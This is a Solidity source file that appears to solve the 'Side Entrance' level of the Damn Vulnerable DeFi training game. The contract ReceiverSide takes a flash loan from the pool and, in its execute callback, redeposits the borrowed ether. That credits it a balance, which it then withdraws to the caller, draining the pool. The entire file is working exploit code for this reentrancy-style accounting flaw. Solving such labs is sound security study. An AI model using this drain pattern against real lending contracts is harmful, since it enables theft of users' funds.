// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ReceiverTruster
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverSide{

    SideEntranceLenderPool pool;
    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }


    function attack(uint256 amount) external payable{
        pool.flashLoan(amount);
        pool.withdraw();
        payable(msg.sender).transfer(amount);
        
    }
    function execute() external payable{
        pool.deposit{value:msg.value}();
    }

    fallback() external payable{

    }
    receive() external payable{
        
    }
}
